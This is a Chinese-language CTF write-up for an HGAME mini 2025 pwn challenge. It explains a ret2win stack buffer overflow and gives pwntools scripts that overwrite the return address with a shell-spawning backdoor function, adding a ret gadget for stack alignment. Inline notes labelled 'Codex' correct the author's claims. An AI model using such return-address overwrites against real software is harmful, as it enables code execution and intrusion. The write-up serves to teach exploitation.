---
title: "Introduce yourself"
published: 2026-10-24
description: "利用基础栈溢出覆盖返回地址，并处理栈对齐。"
tags: ["CTF", "Vidar-Team", "HGAME mini 2025", "Pwn", "栈溢出", "ret2win"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 你知道栈溢出么？

这道题我们先看一下IDA分析出的伪代码，我们看到最主要的有两个函数，main和backd00r（字面意思，后门）

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stream: stdin, buf: nullptr);
  setbuf(stream: stdout, buf: nullptr);
  setbuf(stream: stderr, buf: nullptr);
  printf(format: "Can you tell me something about you?\n>");
  read(fd: 0, buf, nbytes: 0x38u);
  return 0;
}
```

```c
void __noreturn backd00r()
{
  system(command: "/bin/sh");
  exit(status: 0);
}
```

可以看到backd00r函数的内容就是直接执行shell，可以判断这就是我们需要想办法执行的内容。

观察主函数，分配了一个32字节的char数组，然而下方的read却允许从stdin中读取56个字节，这就是我们要攻击的地方。

调用函数后，进入函数的逻辑是先将稍后需要返回到的地址放到栈上，然后把RBP寄存器的值保存到栈上，因此，这道题中main函数栈区的结构大概是`Buf[32] -> Saved RBP -> Saved RIP`，因此，56个字节完全有能力覆盖后方的Saved RIP地区，我们知道函数返回的时候会从这里拿地址，所以篡改这里的内容就可以控制程序的流程。

我们的目标是要执行backd00r函数，所以这里我们只要把Saved RIP的值修改为backd00r函数的位置就好。

```zsh
❯ checksec --file=./vuln
[*] '/home/copper0so4/Downloads/attachment/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

可以看到这个二进制文件没有开PIE, 所以我们只要直接把IDA中显示的backd00r的地址拿来（`0x4011B6`）覆盖Saved RIP就好了，前面的内容我们直接全部覆盖为A（都行）。

（Codex: No PIE 只说明主程序地址通常固定。上面的 SHSTK 标记也不等于运行时已启用；若影子栈实际生效，直接改返回地址会受阻。[参考](https://www.kernel.org/doc/html/next/x86/shstk.html)）

```python
from pwn import *
p = process("./vuln")
payload = b"A"*40 + p64(0x4011B6)
p.sendafter(b">", payload)
p.interactive()
```

不过实际上remote端不能直接拿来用，因为这题当中恰好会遇到栈对齐问题，我们从汇编中随便找一个ret（这里我选择`0x40101a`），放到backd00r的前面

```python
from pwn import *
p = remote("HOST_REDACTED", 0)
payload = b"A"*40 + p64(0x40101a) +p64(0x4011B6)
p.sendafter(b">", payload)
p.interactive()
```

完成！flag是`[FLAG REDACTED]`

栈对齐是Linux AMD64 ABI下的对RSP的要求，它要求call调用函数的时候RSP mod 16 = 0，而ret的时候RSP mod 16 = 8，因为进入函数的时候会把返回地址压入函数，刚好差8.

（Codex: 这里应说“函数入口时 RSP mod 16 = 8”，而不是“ret 时”。通常 call 前为 0，call 压入 8 字节返回地址后才变为 8。[参考](https://gitlab.com/x86-psABIs/x86-64-ABI/-/blob/master/x86-64-ABI/low-level-sys-info.tex)）
